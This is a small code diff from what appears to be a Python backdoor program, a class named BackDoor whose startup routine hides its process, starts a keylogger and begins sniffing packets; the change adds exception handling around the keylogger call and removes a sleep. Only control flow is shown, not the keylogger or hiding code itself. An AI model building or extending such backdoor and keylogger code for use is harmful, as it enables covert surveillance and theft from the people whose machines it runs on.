@@ -136,11 +136,13 @@ class BackDoor:
         self.process_yaml()
         self.hide_process()
         print("Starting.....")
-        self.start_keylogger()
+        try:
+            self.start_keylogger()
+        except KeyboardInterrupt as e:
+            sys.exit("Closed")
         print("Keylogger started")
         print("Listening for packets")
         print("--------------------------------------------------------------")
-        time.sleep(15)
         sys.exit()
         self.sniff_init()
 
